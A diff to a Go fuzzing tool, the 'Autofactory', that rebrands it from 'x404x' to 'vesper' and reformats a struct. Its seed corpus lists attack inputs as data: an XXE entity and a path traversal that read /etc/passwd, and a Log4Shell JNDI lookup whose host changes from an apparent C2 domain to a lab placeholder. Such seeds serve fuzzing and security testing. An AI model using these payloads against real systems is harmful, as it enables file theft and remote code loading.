@@ -9,7 +9,6 @@ import (
 	"os"
 	"os/exec"
 	"path/filepath"
-	"runtime"
 	"strings"
 	"sync"
 	"time"
@@ -39,19 +38,19 @@ type FuzzCase struct {
 }
 
 type ExploitCandidate struct {
-	Title       string
-	Target      string
-	Payload     string
-	FuzzCase    *FuzzCase
-	Confidence  float64
-	Technique   string
+	Title      string
+	Target     string
+	Payload    string
+	FuzzCase   *FuzzCase
+	Confidence float64
+	Technique  string
 }
 
 func NewAutofactory(cfg interface{}) *Autofactory {
 	aflPath := findAFL()
 	return &Autofactory{
 		config:  cfg,
-		fuzzDir: filepath.Join(os.TempDir(), "x404x_autofactory"),
+		fuzzDir: filepath.Join(os.TempDir(), "vesper_autofactory"),
 		workers: 4,
 		aflPath: aflPath,
 	}
@@ -105,7 +104,7 @@ func (a *Autofactory) generateSeedCorpus() error {
 		[]byte("<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///etc/passwd\">]>"),
 		[]byte{0x00, 0x00, 0x00, 0x00, 0xFF, 0xFF, 0xFF, 0xFF},
 		[]byte("/../../../../etc/passwd"),
-		[]byte("${jndi:ldap://x404x-c2.online:1389/exploit}"),
+		[]byte("${jndi:ldap://vesper-lab.invalid:1389/exploit}"),
 	}
 
 	for i, seed := range seeds {
@@ -283,7 +282,7 @@ func (a *Autofactory) swapBytes(data []byte) []byte {
 }
 
 func (a *Autofactory) spliceData(data []byte) []byte {
-	spliceData := []byte("X404X-SPLICE-SEGMENT-ABCDEFGHIJKLMNOPQRSTUVWXYZ")
+	spliceData := []byte("Vesper-SPLICE-SEGMENT-ABCDEFGHIJKLMNOPQRSTUVWXYZ")
 
 	result := make([]byte, len(data)+len(spliceData))
 	copy(result, data)
